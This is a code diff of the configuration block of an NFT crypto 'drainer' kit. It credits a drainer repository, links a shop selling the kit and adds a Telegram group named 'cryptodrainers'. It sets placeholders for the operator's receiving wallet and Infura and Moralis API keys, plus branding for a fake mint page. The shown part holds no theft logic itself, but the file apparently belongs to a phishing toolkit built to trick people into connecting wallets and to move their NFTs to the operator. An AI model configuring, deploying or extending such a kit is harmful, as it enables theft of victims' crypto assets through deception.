@@ -1,16 +1,18 @@
 /* 
     Credits: https://github.com/0x32Moon/NFT-Crypto-Drainer
     Shop: https://nftservices.sellix.io/
+    Telegram group: https://t.me/cryptodrainers
 */
 
-const address = "YOUR WALLET";    // Your wallet that you have to receive NFTs
-const infuraId = "API KEY"     // Infuria ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "X-API-KEY"    // x-api-key | https://moralis.io/ | For NFTs
+// ⚠️ for infura & moralis, make you sure that you copy same number of characters
+const address = "YOUR WALLET";    // Your ETH wallet that you have to receive NFTs
+const infuraId = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "NFTs Montana",
+    name: "CryptoDrainers",
     title: "@NftMontana MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    date: "12.05.2022",
+    date: "25.05.2022",
     socialMedia: {
         discord: "https://discord.gg/example",
         twitter: "https://twitter.com/example",
